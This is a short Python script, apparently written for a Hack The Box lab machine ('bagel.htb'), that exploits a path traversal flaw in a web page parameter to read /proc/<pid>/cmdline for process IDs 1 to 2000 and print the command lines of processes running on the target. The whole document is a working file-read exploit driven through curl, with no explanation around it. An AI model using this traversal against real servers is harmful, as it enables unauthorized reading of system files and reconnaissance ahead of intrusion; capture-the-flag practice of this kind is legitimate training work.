import os

targeturl = "http://bagel.htb:8000/?page=../../../../../../proc/{}/cmdline"

previous_output = ""
for i in range(1, 2000):
    cmdline_path = f"/proc/{i}/cmdline"
    if os.path.exists(cmdline_path):
        url = targeturl.format(i)
        output = os.popen(f"curl -s {url}").read()
        if 'File' not in output and output != previous_output:
            print(output)
            previous_output = output
